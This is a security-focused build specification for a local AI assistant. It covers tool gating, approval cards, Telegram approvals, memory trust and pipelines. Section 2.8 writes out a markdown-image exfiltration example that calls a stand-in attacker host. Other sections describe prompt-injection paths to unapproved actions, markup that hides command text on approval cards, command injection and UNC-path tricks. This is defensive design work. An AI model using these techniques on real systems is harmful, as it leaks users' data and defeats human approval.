# Z.A.I.N.E Post-Seminar Build Spec (v1, 2026-10-22)

**Lead:** Claude (design + implementation) with Mateen. **Advisor:** Gemini "Argon 4 High" (critique only).
**Status:** Design closed. Implementation starts only after the `seminar-final` tag.
**Sources:** 4 design rounds with Argon, two read-only audits, and direct code checks (file references below).

---

## 0. Principles

1. **One resident model.** All agents share the model that is loaded (3B fast or 7B). No per-agent models.
2. **Fail closed.** Unknown tool, unknown metadata or unknown path → treated as the most dangerous case.
3. **Deterministic before LLM.** Routing, gating, validation and redaction are code. The LLM is never the security decision.
4. **Approval is the boundary.** Windows 11 Home has no Windows Sandbox, and we won't require admin setups. Anything that executes code or touches the outside world goes through a human approval.
5. **Measure before claiming.** Numbers in this spec are measured; guesses are marked UNVERIFIED.

## 1. Measured facts (on the RTX 2050 4GB)

| Fact | Value | Consequence |
| :--- | :--- | :--- |
| Cancelling an Ollama stream | TTFT 2.285s baseline vs 2.305s after cancel (5 runs each) | Background LLM work can be cancelled instantly when the user types |
| Changing `num_ctx` for a loaded model | Full reload, ~12.4s each way | One shared `num_ctx` for every caller (fixed 2026-10-22) |
| Moondream on GPU (swap) | 14–29s, then 13–15s to reload the 3B | Not usable interactively |
| Moondream on CPU (`num_gpu: 0`) | 21s cold, ~4.5s warm, +2.1 GB RAM, 3B stays 100% GPU | **Default vision path** |
| PDF/OCR libraries | None installed (no pypdf, PyMuPDF, pdfplumber, tesseract, rapidocr, easyocr, paddle) | A document tool must be built first |
| Approvals history | 102 proposals: 27 approved, 67 denied, 8 expired; all store `code_or_cmd` + note, forever | Needs retention + redaction |

## 2. Security wall

### 2.1 The choke point
One function, `gate(tool, args, ctx)`, in `agent._execute_tool` **after** alias resolution and parameter normalization and **before** `TOOL_REGISTRY.get(name)` dispatch (current order verified: aliases → normalization → registry lookup → `fn(**args)`).

- `ctx` = active agent profile, session latches (untrusted, privacy), origin (`interactive` / `pipeline` / `telegram`).
- Returns `ALLOW`, `APPROVE` or `DENY`.

| Tool side effect | Interactive, no latch | Untrusted latch set | Pipeline (unattended) |
| :--- | :--- | :--- | :--- |
| `read_only` | ALLOW | ALLOW | ALLOW |
| `write_local` | ALLOW if profile allows | APPROVE | APPROVE (run pauses) |
| `external` / exec | APPROVE | APPROVE | APPROVE (run pauses) |
| Not in profile `(allowed ∪ extra) − denied` | DENY | DENY | DENY |

Phase-in: ship in **warn mode** first (log what would be denied), then enforce.

### 2.2 Tool metadata (`side_effect`, `returns_untrusted`)
Three layers (Argon's proposal, adopted):
1. **Cluster defaults set high:** `WEB_SOCIAL` = external + untrusted, `DEV_CODE` = write_local, and so on.
2. **Explicit downward overrides** only for tools verified read-only.
3. **Fail-closed default:** a tool with no metadata (including the ~50 unclustered tools) = `external` + `returns_untrusted=True`.

Enforced by a **unit test** that fails if any registered tool lacks resolved metadata. At runtime we fail closed instead of refusing to boot.

**Nested calls.** Tools call each other's Python functions directly (`code_assistant` → `run_ponytail_coder`, `deep_search` → `search_vault`, `open_x` → `access_social_platform`, `launch_zaine_cascade` → `open_vscode`). Rewiring them all through a `call_tool()` helper is churn. Instead:
- A test scans `tools.py` (AST) for registered tool functions that call other registered tool functions.
- A tool's **effective** side effect is the maximum across what it calls. The test fails if the declared value is lower.
- Cycles (`ponytail` ↔ `code_assistant`) get a recursion guard.

### 2.3 Session latches
- **Untrusted latch:** set when any `returns_untrusted` result enters the conversation. It **persists across turns** and is released only by `/new`. (Argon's fix: a single-turn latch lets "okay, save that" in the next turn bypass approval. Releasing when content "leaves the window" is rejected because window and summary bookkeeping is unreliable.) Effects:
  - write_local and external calls need approval (table above);
  - the approval card shows `untrusted content in context: <source>`;
  - episode summaries from latched sessions inherit `UNTRUSTED` and **never** create `05_Lessons` entries;
  - shell-looking code blocks in replies carry a "came from untrusted content, don't run blindly" marker (counters "user-as-executor" injection).
- **Privacy latch** (for cloud): `LOCAL_ONLY` by default. Set by vault People notes, face data, screen/webcam, documents, or the untrusted latch. Released only by `/new` or explicit `/declassify`. `/declassify` can never clear the untrusted latch.

### 2.4 Execution tools
- `execute_command`: **always** requires approval. **No shell allowlist** (accepted: `type`/`findstr` read `.env` and the vault around the memory gate, `dir`/`tree` with UNC paths start SMB, `git status` in an untrusted repo runs `core.fsmonitor`).
- `run_python_script`: **always** requires approval (today it requires none, `tools.py:422`), and is limited to the workspace. Remove the project-root fallback: today `Path(__file__).parent / script_path` accepts `../..` and absolute paths, so any `.py` on disk can run.
- **Scrubbed subprocess env:** no tool subprocess passes `env=` today (`tools.py` has 0 occurrences), so children inherit everything. `obsidian_adapter.py`, `heartbeat.py`, `telegram_bridge.py` and others call `load_dotenv`, so `.env` secrets sit in `os.environ`. Pass an explicit env: `PATH`, `SYSTEMROOT`, `TEMP`, `TMP`, `USERPROFILE`, `PYTHONIOENCODING`, and nothing with KEY/TOKEN/SECRET/PASSWORD.
- `open_application`: launch only from a fixed name→executable map, without `shell=True` (today it builds `cmd /c start "" "{app}"` and runs it with `shell=True`, so a quote in `app_name` is command injection). Reject `.lnk`, `.bat`, `.cmd`, `.vbs`, `.ps1`, `file:` and custom URI schemes (`ms-msdt:` and similar).
- `create_custom_tool`, `install_python_package`: **unregistered by default**, enabled only by a config flag. Generated tools are saved disabled until the user reviews a diff.

### 2.5 Central path validator
Every filesystem tool calls one validator **before any filesystem access** (`Path.resolve()` on a UNC path already touches the network):
1. String checks: reject leading `\\`, `//`, `\\?\`, `\\.\`; any `:` after the drive letter (NTFS alternate data streams); reserved names (`CON`, `NUL`, `PRN`, `AUX`, `COM1-9`, `LPT1-9`); `%` and `$` sequences.
2. Then `resolve()` + `is_relative_to(root)`.

Verified gap: `_resolve_workspace_path` first converts `\` to `/`, so `\\host\share\x` becomes `//host/share/x`. Joined to the workspace path, that yields the UNC path `\\host\share\x`, and `.resolve()` runs before the containment check.

### 2.6 Approval card integrity
- **Markup injection (found in code review, missed by both audits):** `ApprovalCard` renders `Static(f"Payload: {self.command}")` (`tui/widgets/chat.py:270`). Textual `Static` parses Rich markup by default, so a payload containing `[#030712]...[/]` (the background colour) or similar tags can hide part of a destructive command on the card. Render payload and reason with markup disabled or `rich.markup.escape`. Escape the same way on the Telegram path.
- Show the **full** payload, never truncated (the title truncates to 60 chars, so the payload line must be complete).
- Keep deterministic fields (tool, raw payload, untrusted source) visually separate from explanatory text. Today `reason` is written by the tool code (`description`), not the LLM. If an LLM-written explanation is ever added, it is labelled UNVERIFIED while the untrusted latch is set.
- An Ultron/LLM critique may appear only as clearly labelled advisory text with a 10s timeout. It never auto-approves and is never shown as "safe".

### 2.7 Secrets, logs, retention
- `.zaine_core.json` (project root) stores the API token, so any script Zaine runs can read it. Move it to `%LOCALAPPDATA%\Zaine\`. The real control is still approval on code execution, because scripts run as the same user.
- Approvals DB: redact secret patterns in `code_or_cmd` and notes at write time; 90-day retention.
- Profiler logs: metadata only, never prompt or response text.
- Cloud requests are logged locally as metadata and hashes only.

### 2.8 Network surface
- `core_service` binds 127.0.0.1 with `X-Zaine-Token` + Host/CORS checks; the Telegram whitelist + `/pair` PIN stay.
- Future web UI: CSP `img-src 'self' data:`, and strip external images and links from model output, because an injected `![](https://attacker/?q=...)` would leak context without any tool call.

### 2.9 Telegram approval path (verified 2026-10-22)
How it works today: `require_approval()` → `ApprovalRegistry` stores the proposal and `_dispatch_telegram_alert` posts it straight to the Bot API (`approval.py:169`) with ✅ Approve / ❌ Deny / ℹ️ Explain buttons. `telegram_bridge.py` polls for updates, and `handle_callback_query` calls `ApprovalRegistry.approve/deny`. Text commands `/pending`, `/approve [id]`, `/deny [id]` and `/explain [id]` also work. `approve()` only acts on PENDING proposals, so the first decision wins (TUI or Telegram). Button presses are checked against `TELEGRAM_ALLOWED_USER_ID` (`telegram_bridge.py:1256`). The bot is currently paired.

Fixes:
1. **The phone card doesn't show the command.** It shows `title`, which `execute_command` truncates to 60 chars, plus `description`. The full `code_or_cmd` only appears after ℹ️ Explain, capped at 500 chars. The Approve button must sit under the full payload (sent as a plain-text code block), with a "payload truncated, open Explain" marker that disables Approve when it doesn't fit.
2. ✅ **Fixed 2026-10-22** (now requires `/approve <id>` / `/deny <id>`). **Bare words trigger decisions.** The text handler matches `startswith(("/approve", "approve"))` and `("/deny", "deny")`, so a normal chat message or a transcribed voice note that starts with "approve..." approves the **latest** pending proposal. Require the slash form and an explicit ID.
3. **`/approve` with no ID approves whatever is newest.** If a second proposal arrives just before you type, you approve the wrong one. Require an ID; if exactly one proposal is pending, the reply asks for confirmation before acting.
4. **Pairing leaks its own PIN.** When unpaired, the lock message shows the real PIN (`/pair {TELEGRAM_PAIR_PIN}`) to anyone who messages the bot, and the code default is `7788`. Never echo the PIN, remove the default (refuse to pair if unset), rate-limit attempts, and require confirmation on the desktop. While unpaired, the callback check is also skipped (`if TELEGRAM_ALLOWED_USER_ID and ...`).
5. **Markdown injection.** Title and description go into a `parse_mode="Markdown"` message unescaped. Send the payload as escaped/plain text (same rule as the TUI markup fix in 2.6).
6. **Untrusted latch and pipelines.** The phone card must show the same `untrusted content in context: <source>` line and the pipeline/run ID, because Telegram is where unattended pipeline approvals get answered.
7. **YouTube buttons** (`yt_approve` → `publish_approved_video`) look up the pending-review queue. Double-tap safety after publishing is UNVERIFIED; add an idempotency check (spec §5).

### 2.10 Cloud wall (Gemini first)
- Off unless enabled. Per-request redaction preview showing exactly what leaves the machine.
- Never sent: vault People, face data, screenshots, webcam frames, documents (unless consented per file), anything while the privacy latch is set.
- Keys in `.env`, read only by the gateway module.

## 3. Agents (VisionQuest)
- Profiles are JSON data: `agent_id` (stable, e.g. `zaine-coder`), `display_name` ("E.D.I.T.H."), role prompt (≤3 lines, written for a 3B), `allowed_clusters`, `extra_tools`, `denied_tools`, memory namespace, `max_steps`, approval policy. Renaming = config change only.
- Selection is deterministic: explicit `/agent <name>` or a keyword/cluster match; an LLM is used only for ambiguous cases. Switching = new system prompt + clusters on the same model.
- Council mode (draft → critique → approve) is opt-in only and built late (it triples latency).
- D.U.M.-E & U (maintenance): pure Python first. LLM micro-jobs (`num_predict` ≤96) only when idle (no active stream and ≥120s since the last user turn), cancelled the moment a user turn arrives.
- The no-keyword fallback (currently SYSTEM + DEV_CODE, which exposes `execute_command`/`open_application` on small talk) becomes a read-only conversational cluster.

## 4. Memory
- **Trust enum (existing):** AUTHORITATIVE (user), VERIFIED (system), DERIVED (conversation), PROVISIONAL (import / agent inference), UNTRUSTED (tool / web). Ranking weights 4.0 / 2.5 / 1.0 / 0.4 / 0.1.
- **No autonomous promotion.** Repetition only creates `/review` candidates; promotion needs the user.
- **Data fix:** the 6 People notes carry `trust: authoritative` with `source: import`, which contradicts "imports are PROVISIONAL". Resolve during `/review` (the user confirms each one as AUTHORITATIVE).
- **Storage:** new FTS5 tables (`memory_fts`, `doc_chunks_fts`) in `vault/vault.db` next to `notes_fts`; back up by zipping `vault/` before migration. `zaine_memory.db` is an empty orphan: point `home_ops.py` backups at the real DB, then retire it.
- **Lessons:** don't move the 472 `05_Lessons` notes. Downweight that folder, stop mirroring new auto-lessons to the vault, and clean lesson tags (many are whole sentences).
- Episode summaries keep a pointer to the raw turns. Summaries are stored separately and never replace the raw turns.

## 5. Pipelines
- JSON spec: `pipeline_name`, `version`, `triggers`, `steps[]` with `type` (tool / agent / approval / condition), `inputs` / `outputs`, `side_effect_level`, `timeout`, `retries`. Pydantic validation (pydantic is installed).
- **Creation:** template selection + parameter filling only. Natural-language-generated specs come later: saved disabled, validated, shown as a diff, enabled by the user.
- **Runner state:** `pipeline_runs` + `pipeline_steps` tables in `zaine_tasks.db` (back up first).
- **Idempotency:** each side-effect step writes `started` (key = run_id + step_id + input hash) before acting and `completed` after. On crash: read_only steps re-run; write_local steps re-run only if overwrite-safe; external steps found started-but-not-completed go to human review and are never retried automatically.
- **Crash recovery** always pauses; resume is a human command.
- **Kill** = stop + mark. There is no rollback of external effects.
- **Approvals in pipelines:** non-blocking proposals that stay PENDING up to 7 days (then EXPIRED, never executed); inputs re-validated on resume (file exists, hash unchanged).
- **Untrusted data flow:** step outputs from documents/web carry the untrusted flag, so any later write in the run needs approval. Large inputs are chunked to fit `num_ctx`.
- **Triggers:** manual, schedule (APScheduler is installed), and folder polling inside the heartbeat with file-hash dedupe (watchdog is not installed). Rate limit: 1 run per 60s per trigger. A pipeline's outputs may never sit inside a watched folder.
- **Quiet mode:** a shared file `{mode, set_by_pid, set_at, expires_at}`, checked by every process before any trigger (heartbeat runs in `main.py` and `telegram_bridge.py`, not in `core_service`). Expired entries are ignored, so a crash can't leave the system silenced forever. `ZAINE_DEMO=1` implies quiet.
- **YouTube:** 6 `DAILY_SLOTS` (08:30, 11:00, 13:30, 16:00, 18:30, 21:00); renders wait in `PENDING_REVIEW`; `trigger_youtube_pipeline` runs the whole render via `check_and_run_daily_youtube_schedule(force=True)`. First, wrap it as a single `external` step behind the existing Guardian/Telegram approval, without re-modelling its internals.
- **Commands:** `/pipeline list | run | pause | resume | kill`, `/quiet`.

## 6. Documents & vision
- New `read_document(path)` tool (pypdf, pure Python, CPU). Output is untrusted, chunked into `doc_chunks_fts`, and summarized chunk by chunk within `num_ctx`.
- Summaries go to a documents store, not `05_Lessons`.
- Vision: Moondream on CPU by default, with a longer `keep_alive` after the first use. Its OCR is weak, so CPU OCR (rapidocr) is evaluated separately.

## 7. Build order

| Phase | Contents | Size | Exit test |
| :--- | :--- | :--- | :--- |
| **P0** (done) | Seminar fixes: pre-warm, fast mode, num_ctx reload fix, TUI/ponytail/bat fixes | — | Rehearsal passes |
| **P1 Safety foundations** | Shared Ollama client (`get_num_ctx`, keep_alive) used by every caller; path validator; scrubbed subprocess env; `run_python_script` fix + approval; approval-card markup escape; `open_application` map; token file moved; Telegram approval fixes (§2.9 items 1–5); fix flaky `test_g`/`test_h` (timing races) | M | Unit tests: UNC/ADS/`..` paths rejected; markup payload rendered literally; child process sees no secrets |
| **P2 Gate + metadata** | Tool metadata layers, AST nested-call test, `gate()` in warn mode → enforce, read-only fallback cluster, untrusted latch | M | Out-of-profile tool denied; write after web result asks approval in the next turn too |
| **P3 Documents & vision** | `read_document`, chunk store, CPU Moondream | M | 20-page PDF summarized without reload; image turn followed by a chat turn with no 3B reload |
| **P4 Memory** | FTS5 tables, ranking, `/review`, People trust fix, stop lesson mirroring, privacy latch | L | "Who is X" ranks the People note first; no auto-promotion |
| **P5 Agents** | JSON profiles, `/agent`, D.U.M.-E idle micro-jobs | M | Agent switch changes tools + prompt; background job cancelled on user input |
| **P6 Pipelines** | Spec, runner, idempotency, quiet file, PDF-to-note template, YouTube wrapper | L | Crash mid-run → paused; external step never re-runs automatically |
| **P7 Cloud gateway** | Gemini behind the privacy wall + preview | M | Latched session can't reach cloud |

**Cut or deferred:** local LoRA/DPO, GitHub assimilator, web-API reverse engineering, skill synthesis (last, sandbox + approval), Council mode (late, opt-in), `/brag` (lowest; git log + user-confirmed notes only), cloud vision without per-image consent.

## 8. Open items
- Confirm CPU Moondream RAM headroom while a YouTube render runs (RAM >90% during renders).
- Decide on a CPU OCR library after a small accuracy test on screenshots.
- People-note trust review with the user.
